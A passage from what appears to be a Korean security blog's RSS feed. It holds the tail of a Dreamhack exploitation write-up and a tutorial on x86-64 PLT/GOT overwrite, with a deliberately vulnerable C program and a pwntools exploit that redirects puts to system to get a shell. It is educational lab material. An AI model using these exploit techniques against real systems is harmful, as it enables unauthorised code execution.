&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hexdump&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;# gdb.attach(p)
# raw_input(&quot;1&quot;)
&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;interactive&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;그 결과, 목표 시스템의 쉘을 획득할 수 있었고, ls 명령어로 플래그 파일의 위치를 확인한 후 (find 명령어로 해도 되는데 나는 ls 명령어로 눈에 보이는 곳에 있는지 확인하고 없다면 find 명령어를 사용하는 쪽을 선호한다) cat 명령어를 이용해 플래그를 알아냈다.&lt;/p&gt;
</description>
        <pubDate>Wed, 28 Dec 2022 03:11:23 -0600</pubDate>
        <link>https://touBVa.github.io/blog/dreamhack_system_hacking/step5-basic_exploitation_000</link>
        <guid isPermaLink="true">https://touBVa.github.io/blog/dreamhack_system_hacking/step5-basic_exploitation_000</guid>
      </item>
    
      <item>
        <title>PLT &amp; GOT Overwrite in x86-64</title>
        <description>&lt;ul id=&quot;markdown-toc&quot;&gt;
  &lt;li&gt;&lt;a href=&quot;#0-pltgot란&quot; id=&quot;markdown-toc-0-pltgot란&quot;&gt;0. PLT&amp;amp;GOT란?&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#01-컴파일-시의-행위동적-라이브러리-참조&quot; id=&quot;markdown-toc-01-컴파일-시의-행위동적-라이브러리-참조&quot;&gt;0.1. 컴파일 시의 행위(동적 라이브러리 참조)&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#02-파일-실행-시의-행위동적-라이브러리-참조&quot; id=&quot;markdown-toc-02-파일-실행-시의-행위동적-라이브러리-참조&quot;&gt;0.2. 파일 실행 시의 행위(동적 라이브러리 참조)&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#03-정리&quot; id=&quot;markdown-toc-03-정리&quot;&gt;0.3. 정리&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#1-코드-정적-분석&quot; id=&quot;markdown-toc-1-코드-정적-분석&quot;&gt;1. 코드 정적 분석&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#11-plt와-got-직접-따라가-보기&quot; id=&quot;markdown-toc-11-plt와-got-직접-따라가-보기&quot;&gt;1.1 plt와 got 직접 따라가 보기&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#12-코드-정적-분석&quot; id=&quot;markdown-toc-12-코드-정적-분석&quot;&gt;1.2 코드 정적 분석&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#2-익스플로잇-설계&quot; id=&quot;markdown-toc-2-익스플로잇-설계&quot;&gt;2. 익스플로잇 설계&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#3-익스플로잇&quot; id=&quot;markdown-toc-3-익스플로잇&quot;&gt;3. 익스플로잇&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h1 id=&quot;0-pltgot란&quot;&gt;0. PLT&amp;amp;GOT란?&lt;/h1&gt;

&lt;p&gt;&lt;a href=&quot;https://toubva.github.io/blog/protostar-stack5-x86-x64/#/&quot;&gt;이전 포스트의 섹션 3&lt;/a&gt; 에서 다루었던 요소가 있다. 바로 GCC 를 이용한 C 언어 소스 코드 컴파일 시, 파일 실행 시의 행위였다. 가볍게 해당 과정을 되살려보자. (정적 라이브러리 방식은 현재 주제와 관련 없으므로 쓰지 않았다)&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;01-컴파일-시의-행위동적-라이브러리-참조&quot;&gt;0.1. 컴파일 시의 행위(동적 라이브러리 참조)&lt;/h2&gt;

&lt;ol&gt;
  &lt;li&gt;프로그램 컴파일 명령어를 보낸다.&lt;/li&gt;
  &lt;li&gt;gcc는 링커를 트리거한다.&lt;/li&gt;
  &lt;li&gt;링커는 어떤 컴파일러를 쓰는지, 소스에는 어떤 라이브러리가 명시되어 있는지 체크해 필요한 라이브러리를 찾아낸다.
    &lt;ul&gt;
      &lt;li&gt;이 때 라이브러리를 찾아내는 과정에서는 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Linker Name&lt;/code&gt; 을 참고한다(.so 파일).&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;그리고 해당 라이브러리의 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;soname&lt;/code&gt; 을 읽어온다(.so.2.6 등의 버전 넘버).&lt;/li&gt;
  &lt;li&gt;읽어온 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;soname&lt;/code&gt; 을 기준으로 라이브러리들을 파일에 연결시켜 컴파일한다.&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;02-파일-실행-시의-행위동적-라이브러리-참조&quot;&gt;0.2. 파일 실행 시의 행위(동적 라이브러리 참조)&lt;/h2&gt;

&lt;ol&gt;
  &lt;li&gt;파일을 실행하면 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Dynamic Loader&lt;/code&gt; 가 트리거된다.&lt;/li&gt;
  &lt;li&gt;Dynamic Linking 된 공유 라이브러리들을 컴파일 단계에서 확보해 둔 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;soname&lt;/code&gt; 을 이용해 찾아 낸다.&lt;/li&gt;
  &lt;li&gt;이후 찾아낸 라이브러리들을 해당 ELF 파일의 가상 메모리 섹션에 탑재한다. (리눅스의 경우 heap과 stack 사이에 라이브러리가 탑재되고 윈도우의 경우 스택의 엉덩이에 힙의 엉덩이가 맞붙어 있는.. 형태라… 애플리케이션이 탑재된 영역 아래에 커널 라이브러리 영역이 탑재된다)&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;&lt;em&gt;&lt;br /&gt;&lt;/em&gt;&lt;/p&gt;

&lt;h2 id=&quot;03-정리&quot;&gt;0.3. 정리&lt;/h2&gt;

&lt;p&gt;즉, 정적 라이브러리 방식으로 파일을 컴파일 및 실행하게 된다면 당연히 모든 라이브러리와 함수가 해당 소스 코드에 포함된 상태로 실행되므로 굳이 라이브러리에 명시된 함수의 주소를 알아오는 과정이 필요하지 않지만&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;동적 라이브러리 링킹 방식으로 파일을 컴파일하거나 실행&lt;/strong&gt;할 때, 다양한 라이브러리 파일을 해당 소스 코드에 링킹하기 때문에 &lt;strong&gt;해당 라이브러리는 메모리의 어느 위치에 탑재되었는지, 그 라이브러리 내에 정의된 함수들은 어느 위치에 탑재되었는지&lt;/strong&gt;에 관한 정보가 필수적이다.&lt;/p&gt;

&lt;p&gt;이런 식의 정보를 쉽게 알려주기 위해 &lt;strong&gt;plt와 got&lt;/strong&gt;를 사용하게 되었다.&lt;/p&gt;

&lt;p&gt;위의 기능이 언제나 가능하도록 만들기 위해 &lt;strong&gt;“plt의 주소는 언제나 고정되어 있다”.&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/pltgot/Untitled.jpeg&quot; alt=&quot;최초로 함수의 주소를 알아올 때 plt와 got의 행위를 나타낸 도식.&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;최초로 함수의 주소를 알아올 때 plt와 got의 행위를 나타낸 도식.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;PLT(Procedure Linkage Table)&lt;/strong&gt;는 현재 콜하려는 라이브러리상의 함수의 주소를 &lt;strong&gt;got의 어느 부분이 가리키는지&lt;/strong&gt; 알고 있다.
    &lt;ul&gt;
      &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;jmp {rip-x(address)}&lt;/code&gt; 포맷의 인스트럭션을 이용해 필요한 함수의 주소를 가지고 있는 got의 지점으로 포워딩해 준다.&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;GOT(Global Offset Table)&lt;/strong&gt;는 현재 콜하려는 라이브러리상의 &lt;strong&gt;함수의 주소를 정확히&lt;/strong&gt; 알고 있다.
    &lt;ul&gt;
      &lt;li&gt;다만, got 상에서 처음으로 함수의 주소를 알아내려 할 때 당시에는 got에 해당 함수의 주소가 없다.
        &lt;ul&gt;
          &lt;li&gt;got를 이용해 해당 함수의 주소를 알아내려고 할 때가 되어서야 Linker가 dl_resolve라는 함수를 이용해 주소를 알아와서 넣어준다.&lt;/li&gt;
          &lt;li&gt;따라서 첫 번째 접근 이후부터는 got에 항상 주소가 있게 된다.&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;여기에서 중요한 건 &lt;strong&gt;“plt의 주소는 언제나 고정되어 있다”는 점이다. 이를 악용해 ASLR 우회가 가능&lt;/strong&gt;하기 때문이다.&lt;/p&gt;

&lt;p&gt;차후 다른 포스팅에서 got 변조를 이용한 ASLR 우회를 다룰 계획이다.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h1 id=&quot;1-코드-정적-분석&quot;&gt;1. 코드 정적 분석&lt;/h1&gt;

&lt;p&gt;먼저 주어진 문제 코드를 분석해 보자.&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;//got_overwrite.c&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;//gcc -o got_overwrite -no-pie&lt;/span&gt;
&lt;span class=&quot;cp&quot;&gt;#include&lt;/span&gt;&lt;span class=&quot;cpf&quot;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;
#include&lt;/span&gt;&lt;span class=&quot;cpf&quot;&gt;&amp;lt;stdlib.h&amp;gt;&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
	&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;puts_got&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x601018&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// puts_got&lt;/span&gt;
	&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;long&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;libc_system: %p&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;puts&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Overwrite puts_got&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;scanf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;%lx&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
	&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;puts_got&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;//overwrite puts_got&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;puts&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/bin/sh&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;11-plt와-got-직접-따라가-보기&quot;&gt;1.1 plt와 got 직접 따라가 보기&lt;/h2&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;*puts_got&lt;/code&gt; 의 초기화 값으로 로컬 환경에서 puts의 got 위치 주소를 직접 찾아다 넣어 줘야 한다.&lt;/p&gt;

&lt;p&gt;puts의 got 위치를 찾는 방법은 아래와 같다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/pltgot/Untitled%201.jpeg&quot; alt=&quot;Untitled&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;pwndbg를 이용해 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;disas main&lt;/code&gt;을 하면, main+121지점에서 puts를 콜할 때 명시적 주소를 콜하는 것을 확인할 수 있다.&lt;/p&gt;

&lt;p&gt;이 때 0x400520에는 무엇이 있길래 그쪽으로 rip를 이동시켜 주는 걸까? 직접 알아보면 아래와 같은 결과를 볼 수 있다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/pltgot/Untitled%202.jpeg&quot; alt=&quot;Untitled&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;plt는 got의 특정 위치에 저장된 puts 함수의 주소로 rip를 포워딩&lt;/strong&gt;해 주는 역할을 하고 있었다.&lt;/p&gt;

&lt;p&gt;인스트럭션에 의한다면 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x400526+0x200af2 = 0x601018&lt;/code&gt; 에 실제 puts 함수의 주소가 저장되어 있을 것이다.&lt;/p&gt;

&lt;p&gt;jmp 인스트럭션이 위치한 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x400520&lt;/code&gt; 이 아닌 바로 다음 인스트럭션의 주소인 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x400526&lt;/code&gt; 를 rip의 값으로 사용하는 이유는, 어떤 인스트럭션을 읽어 오기 위해 메모리에 접근하는 순간 pc, 즉 rip의 주소는 바로 다음 인스트럭션을 가리키게 되기 때문이다. 즉, 저 인스트럭션이 수행되는 순간의 rip는 저 인스트럭션 바로 다음 인스트럭션의 주소를 가리키고 있기 때문이다.&lt;/p&gt;

&lt;p&gt;해당 주소(&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x601018&lt;/code&gt;)에 저장된 값을 확인해 보았다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/pltgot/Untitled%203.jpeg&quot; alt=&quot;Untitled&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;got의 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x601018&lt;/code&gt; 지점에는 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x400526&lt;/code&gt;이 저장되어 있었고, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x400526&lt;/code&gt;으로 이동하면 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x601010&lt;/code&gt;으로 점프하게 되어 있다. &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x601010&lt;/code&gt;은 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x601018&lt;/code&gt;과 값이 가깝기 때문에 아마 got의 일부분일 것으로 예상되어 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x601010&lt;/code&gt; 지점에 저장된 값 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x7ffff7dea8f0&lt;/code&gt; 주소의 인스트럭션을 확인해 보니 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dl_resolve&lt;/code&gt; 계열의 함수임을 알 수 있었다.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;즉, got 는 결과적으로 puts 함수의 주소를 알아내기 위해 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dl_resolve&lt;/code&gt; 계열의 함수를 호출한다는 것을 확인할 수 있었다. 해당 함수가 정확히 어떤 매커니즘으로 puts 함수의 주소를 알아내 리턴해주는지에 관해서는 &lt;a href=&quot;https://rond-o.tistory.com/216#f61b16a1-7700-4283-826f-d6ba19990bf7&quot;&gt;여기 블로그&lt;/a&gt;가 정말 잘 설명해 두었으니 링크를 걸어둔다.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;어찌 되었든, puts를 찾기 위해 plt가 rip를 jmp 시키는 주소가 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x601018&lt;/code&gt; 임을 알았으니 주어진 코드의 puts_got 값을 로컬 환경에 맞게 고칠 수 있게 되었다.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;12-코드-정적-분석&quot;&gt;1.2 코드 정적 분석&lt;/h2&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;//got_overwrite.c&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;//gcc -o got_overwrite -no-pie&lt;/span&gt;
&lt;span class=&quot;cp&quot;&gt;#include&lt;/span&gt;&lt;span class=&quot;cpf&quot;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;
#include&lt;/span&gt;&lt;span class=&quot;cpf&quot;&gt;&amp;lt;stdlib.h&amp;gt;&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
	&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;puts_got&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x601018&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// puts_got&lt;/span&gt;
	&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;long&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;libc_system: %p&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;puts&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Overwrite puts_got&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;scanf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;%lx&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
	&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;puts_got&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;//overwrite puts_got&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;puts&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/bin/sh&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;주어진 코드는 먼저 system 함수의 주소를 leak 해주고, 입력받은 값을 puts_got 변수 안에 있는 주소에 넣어주는 역할을 하고 있다.&lt;/p&gt;

&lt;p&gt;puts_got 자체가 got 테이블에 저장된 값을 변경하는 것이기 때문에, 우리는 마지막 줄에서 puts가 호출되는 시점에 엉뚱한 system 함수가 호출되도록 puts_got 변수에 system 함수의 주소를 넣어줘야 한다.&lt;/p&gt;

&lt;p&gt;또한 사용자에게 값을 받는 시점에 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;%lx&lt;/code&gt; 포맷 스트링을 사용하기 때문에 기본으로 8 바이트 값을 받는다고 생각하고 있어 패딩 걱정은 하지 않아도 좋을 것이다.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h1 id=&quot;2-익스플로잇-설계&quot;&gt;2. 익스플로잇 설계&lt;/h1&gt;

&lt;p&gt;앞서 분석했던 점을 감안하면 익스플로잇이 해야 할 일은 다음과 같다.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;먼저 프로그램이 출력하는 시스템 함수의 주소를 받아 저장한다.&lt;/li&gt;
  &lt;li&gt;저장했던 시스템 함수의 주소를 스트링 형식으로 입력한다. 애초에 포맷 스트링이 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;%lx&lt;/code&gt; 이므로 스트링으로 입력해 줘야 컴파일러가 알아서 hex 값으로 인식할 것이다.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h1 id=&quot;3-익스플로잇&quot;&gt;3. 익스플로잇&lt;/h1&gt;

&lt;p&gt;익스플로잇 코드는 아래와 같다.&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pwn&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;process&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;./got_overwrite&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvuntil&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;0x&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;libc_system&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(),&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;hex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;libc_system&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x0000ffffffff&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;# gdb.attach(p)
# raw_input(&quot;1&quot;)
&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
